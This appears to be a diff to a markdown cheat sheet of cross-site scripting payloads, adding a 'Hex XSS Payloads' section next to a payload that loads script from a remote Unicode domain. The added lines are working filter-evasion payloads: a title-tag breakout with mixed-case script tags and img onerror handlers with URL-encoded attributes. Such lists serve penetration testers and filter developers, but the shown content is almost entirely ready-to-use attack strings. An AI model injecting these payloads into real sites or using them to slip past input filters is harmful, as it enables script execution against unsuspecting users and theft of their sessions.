@@ -351,6 +351,14 @@ GET /?q=xss     POST /q=xss
 <script/src=//Ǌ.₨></script>
 ```
 
+### Hex XSS Payloads:
+
+```
+</title><scRipt>alert(0x00C57D)</scRipt>
+<iMg src%3dN onerror%3dalert(0x0036A9)>
+<iMg src%3dN onerror%3dalert(0x000D98)>
+```
+
 ### Some awesome people on twitter
 
 * [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
